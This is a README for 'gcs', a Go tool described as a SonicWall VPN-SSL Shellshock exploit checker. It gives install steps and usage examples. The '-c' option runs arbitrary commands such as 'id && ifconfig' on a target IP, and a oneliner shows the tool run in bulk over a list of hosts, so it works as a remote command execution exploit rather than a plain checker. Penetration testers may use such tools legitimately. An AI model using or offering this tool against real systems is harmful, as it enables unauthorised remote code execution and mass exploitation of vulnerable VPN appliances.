# gcs
SonicWall VPN-SSL Exploit Checker* using Golang ( * and other targets vulnerable to shellshock ).

# Install
```
▶ go get -u -v github.com/gustavorobertux/gcs
```
# Basic Usage
### oneliner
```
▶ for i in $(cat list.txt) ; do echo $i | xargs ./gcs -i ; done
```
### Simple command - Default -c echo
```
▶ ./gcs -i x.x.x.x
```
### With commands
```
▶ ./gcs -i x.x.x.x -c id
▶ ./gcs -i x.x.x.x -c 'id && ifconfig'
```
# Screenshot
<p align="center"><img src="https://github.com/gustavorobertux/gcs/blob/main/gcs.png" width="90%"></p>
